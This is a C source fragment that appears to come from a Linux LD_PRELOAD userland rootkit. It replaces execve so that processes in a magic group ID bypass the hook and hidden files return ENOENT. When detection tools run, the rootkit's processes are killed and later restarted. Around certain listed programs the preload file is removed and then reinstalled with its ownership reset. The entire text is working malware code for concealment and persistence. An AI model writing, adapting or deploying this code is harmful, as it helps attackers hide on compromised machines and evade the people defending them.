int execve(const char *filename, char *const argv[], char *const envp[])
{
    HOOK(o_execve,"execve");
    if(getgid()==MGID) return o_execve(filename,argv,envp);
    if(hxstat(filename)){ errno=ENOENT; return -1; }

    /* if someone is running a process that could lead to us being visible,
     * kill all rootkit processes. */
    int pid, i;
    if(is_bad_proc(filename))
    {
        /* they need root privs to be able to kill rk procs. */
        if(getuid() != 0 && geteuid() != 0)
        {
            errno=EPERM;
            return -1;
        }

        kill_rk_procs();

        if((pid=fork())<0) return pid;
        else if(pid==0) return o_execve(filename,argv,envp);
        (void) wait(NULL);

        (void) o_execve("/usr/bin/cat",nargv,NULL); // run something so we start up again
        exit(0);
    }

    for(i=0; i<sizeof(hprocs)/sizeof(hprocs[0]); i++)
    {
        char fnm_proc[64];
        snprintf(fnm_proc, sizeof(fnm_proc), "*/%s", hprocs[i]);

        if(strstr(cprocname(), hprocs[i]) || strstr(filename, hprocs[i]) || !fnmatch(fnm_proc, filename, FNM_PATHNAME) || getenv(hprocs[i]))
        {
            if(getuid() != 0 && geteuid() != 0)
            {
                errno=EPERM;
                return -1;
            }

            HOOK(o_unlink,"unlink");
            (void) o_unlink(LDSP);

            if((pid = fork()) == -1) return pid;
            else if(pid == 0) return o_execve(filename,argv,envp);

            (void) wait(NULL);
            reinstall();

            HOOK(o_chown,"chown");
            (void) o_chown(LDSP,0,MGID);
            exit(0);
        }
    }

    return o_execve(filename,argv,envp);
}
